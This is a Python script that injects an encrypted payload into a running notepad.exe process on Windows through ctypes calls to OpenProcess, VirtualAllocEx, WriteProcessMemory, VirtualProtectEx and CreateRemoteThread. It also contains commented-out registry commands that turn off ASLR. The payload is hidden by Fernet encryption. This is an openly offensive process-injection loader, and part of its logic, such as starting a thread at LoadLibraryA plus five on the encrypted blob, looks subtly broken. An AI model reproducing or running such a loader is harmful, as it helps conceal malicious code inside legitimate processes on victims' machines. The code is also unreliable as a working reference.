
import psutil
import subprocess
from cryptography.fernet import Fernet
from ctypes import *
import ctypes

# Disable ASLR
#subprocess.run(["REG", "ADD", "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management", "/v", "MoveImages", "/t", "REG_DWORD", "/d", "0", "/f"], shell=True)

# Enable ASLR
# subprocess.run(["REG", "DELETE", "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management", "/v", "MoveImages", "/f"], shell=True)

key = b'dDTaMKBlwtfmtO3NJ17vIncg98n4mNk_Smno8-AuIho='
f = Fernet(key)
payload_size = 276
encrypted_payload = b'gAAAAABkUVzqmUkS7W0KFh0EDaAf5562DZr4B8y32y1ekPkYZL47Os5l45Ts7oq_Ar_ZqbuCr3fYxM1a1IYuWkuuvecsrp24UbJAghQ-WpV0eQyH8AhnltUozxA7r3anXp_Xe8NtUKnK3fkePQ3s4o4y0JSr8eiQu1ox7JPuK_RjrWmAyVXhfmJ5kEjq_eSVu1wZ7iHrdza2Jt1Nb3gAAmXKyz6n3twOPSSdvqqBOfXHDidzUL138s2mISQZn5b665AncxLWji4b5f7vq3O2vMrhuZ1Z_ssMLzaulZDFe2ff6F5-JbIPQLLGuhIYmAsM-dKn3v4JLhmA1qt8CuCZyZJySAN4R52ytZZ2yH7STvBL43TersSDGCA0tjojW_pe2GjlhC6nrnBK0QlDXoxi4bNlyD5d7GDenpujhN3vNd0hjgKOMQWUXPyiLl3NZeIpeiOZxEs8H76h'


# Find the process to inject the payload into
process_name = "notepad.exe"
for proc in psutil.process_iter():
    if proc.name() == process_name:
        target_process = proc
        break
else:
    # If the process is not running, create a new instance
    target_process = subprocess.Popen(process_name)

# Allocate memory in the target process to store the encrypted payload
process_handle = windll.kernel32.OpenProcess(0x1F0FFF, False, target_process.pid)
memory_allocation = windll.kernel32.VirtualAllocEx(process_handle, None, len(encrypted_payload), 0x3000, 0x04)

# Write the encrypted payload to the allocated memory
windll.kernel32.WriteProcessMemory(process_handle, memory_allocation, encrypted_payload, len(encrypted_payload), None)

# Calculate the address of the entry point in the loaded module
loaded_module = windll.kernel32.LoadLibraryA("kernel32.dll")
entry_point_address = windll.kernel32.GetProcAddress(loaded_module, "LoadLibraryA") + 5

# Create a remote thread in the target process to execute the entry point
windll.kernel32.CreateRemoteThread(process_handle, None, 0, entry_point_address, memory_allocation, 0, None)

# Decrypt the payload in the current process
decrypted_payload = f.decrypt(encrypted_payload)

# Allocate memory in the target process to store the decrypted payload
decrypted_payload_address = windll.kernel32.VirtualAllocEx(process_handle, None, len(decrypted_payload), 0x3000, 0x04)

# Write the decrypted payload to the allocated memory
windll.kernel32.WriteProcessMemory(process_handle, decrypted_payload_address, decrypted_payload, len(decrypted_payload), None)

# Execute the decrypted payload
ctypes.windll.kernel32.VirtualProtectEx(process_handle, decrypted_payload_address, len(decrypted_payload), 0x40, byref(c_ulong()))
ctypes.windll.kernel32.CreateRemoteThread(process_handle, None, 0, decrypted_payload_address, None, 0, None)
